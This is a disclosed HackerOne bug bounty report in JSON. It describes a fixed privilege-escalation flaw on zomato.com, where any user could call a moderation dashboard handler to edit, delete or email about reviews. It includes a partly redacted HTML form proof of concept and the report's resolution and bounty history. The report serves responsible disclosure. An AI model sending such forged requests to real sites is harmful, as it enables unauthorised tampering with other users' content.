{"id":300099,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDAwOTk=","url":"https://hackerone.com/reports/300099","title":"[www.zomato.com] Privilege Escalation - Control reviews - /████dashboard_handler.php","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-12-22T18:51:47.061Z","submitted_at":"2017-12-22T18:51:47.061Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"gerben_javado","url":"/gerben_javado","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/nxCLVa5sJm5BsdGjBdqzDfg8/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2943,"url":"https://hackerone.com/zomato","handle":"zomato","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Zomato","twitter_handle":"Zomato","website":"https://www.zomato.com","about":"The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-03-29T16:58:58.029Z","bug_reporter_agreed_on_going_public_at":"2018-03-29T13:44:44.323Z","team_member_agreed_on_going_public_at":"2018-03-29T16:58:57.799Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"#Introduction \nThe handler that controls all the ███ actions for reviews is accessible for any user. The following actions are thus being left open to anyone: \n\n```\nget_manager_status\nread███████\nunread██████████\n████████\nfeature██████\nunfeature████████\nmoderate████\nunmoderate█████\ndrop\n███\nsend_mail\n█████████\nrevoke\nmark-spam\nspam-revoke\nremove-██████\nadd-█████████\nreject_reported█████████\n███████\n```\nTaken from the following [██████████]████████\n\n#POC\nThis POC will use the action `██████` since it easily allows us to edit any review on Zomato.com. More severe options could be ██████ to read user info.\n\n```html\n\u003cform action=\"https://www.zomato.com/██████████dashboard_handler.php\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"action\" value=\"█████\" /\u003e\n      \u003cinput type=\"hidden\" name=\"review_id\" value=\"31268525\" /\u003e\n      \u003cinput type=\"hidden\" name=\"review\" value=\"Privilege+Escalation\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n\u003c/form\u003e\n```\n\nGo to https://www.zomato.com/review/QvneAY and see the review has changed.\n\n## Impact\n\nAny user is able to control all the ████ actions for the reviews section including emailing, deleting, editing and adding to ██████████.","vulnerability_information_html":"\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\n\u003cp\u003eThe handler that controls all the ███ actions for reviews is accessible for any user. The following actions are thus being left open to anyone: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eget_manager_status\nread███████\nunread██████████\n████████\nfeature██████\nunfeature████████\nmoderate████\nunmoderate█████\ndrop\n███\nsend_mail\n█████████\nrevoke\nmark-spam\nspam-revoke\nremove-██████\nadd-█████████\nreject_reported█████████\n███████\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTaken from the following [██████████]████████\u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003ePOC\u003c/h1\u003e\n\n\u003cp\u003eThis POC will use the action \u003ccode\u003e██████\u003c/code\u003e since it easily allows us to edit any review on Zomato.com. More severe options could be ██████ to read user info.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://www.zomato.com/██████████dashboard_handler.php\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;action\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;█████\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;review_id\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;31268525\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;review\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Privilege+Escalation\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eGo to \u003ca title=\"https://www.zomato.com/review/QvneAY\" href=\"/redirect?url=https%3A%2F%2Fwww.zomato.com%2Freview%2FQvneAY\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.zomato.com/review/QvneAY\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and see the review has changed.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAny user is able to control all the ████ actions for the reviews section including emailing, deleting, editing and adding to ██████████.\u003c/p\u003e\n","bounty_amount":"300.0","formatted_bounty":"$300","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-04-28T13:44:44.411Z","allow_singular_disclosure_after":-84296623.90807612,"singular_disclosure_allowed":true,"vote_count":18,"voters":["sp1d3rs","europa","muon4","spam404","flashdisk","powerjacobb1","asad0x01_","eveeez","apapedulimu","khizer47","and 8 more..."],"structured_scope":{"databaseId":383,"asset_type":"URL","asset_identifier":"*.zomato.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2243463,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@gerben_javado \n\nThanks for your submission. We will review it and get back to you.\n\nBest Regards. ","markdown_message":"\u003cp\u003e\u003ca href=\"/gerben_javado\"\u003e@gerben_javado\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eThanks for your submission. We will review it and get back to you.\u003c/p\u003e\n\n\u003cp\u003eBest Regards. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-22T22:06:10.271Z","updated_at":"2017-12-22T22:06:10.271Z","actor":{"username":"glassofbeer","cleared":false,"url":"/glassofbeer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/166/997/bf60ed9bb749786ae3f68f25703bf0528699cda7_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2243865,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It could be that this endpoint isn't just for reviews but also for comment moderation. Further widening the impact","markdown_message":"\u003cp\u003eIt could be that this endpoint isn\u0026#39;t just for reviews but also for comment moderation. Further widening the impact\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-23T08:03:19.336Z","updated_at":"2017-12-23T08:03:19.336Z","actor":{"username":"gerben_javado","cleared":false,"url":"/gerben_javado","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nxCLVa5sJm5BsdGjBdqzDfg8/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2246702,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This issue has been fixed. ","markdown_message":"\u003cp\u003eThis issue has been fixed. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-26T11:22:22.607Z","updated_at":"2017-12-26T11:22:22.607Z","actor":{"username":"chicken-tikka","cleared":false,"url":"/chicken-tikka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/568/cdbb30fd8932f00a06868a737ab5bdc5c57e5f00_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"gerben_javado","url":"/gerben_javado"},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2271555,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-01-09T05:19:21.247Z","updated_at":"2018-01-09T05:19:21.247Z","actor":{"url":"/zomato","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Zomato"}},"bounty_amount":"250.0","bounty_currency":"usd","bonus_amount":"50.0","genius_execution_id":null,"team_handle":"zomato","collaborator":{"username":"gerben_javado","url":"/gerben_javado"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2544192,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-29T13:44:44.364Z","updated_at":"2018-03-29T13:44:44.364Z","first_to_agree":true,"actor":{"username":"gerben_javado","cleared":false,"url":"/gerben_javado","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nxCLVa5sJm5BsdGjBdqzDfg8/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2544658,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-29T16:58:57.833Z","updated_at":"2018-03-29T16:58:57.833Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2544659,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-29T16:58:58.056Z","updated_at":"2018-03-29T16:58:58.056Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}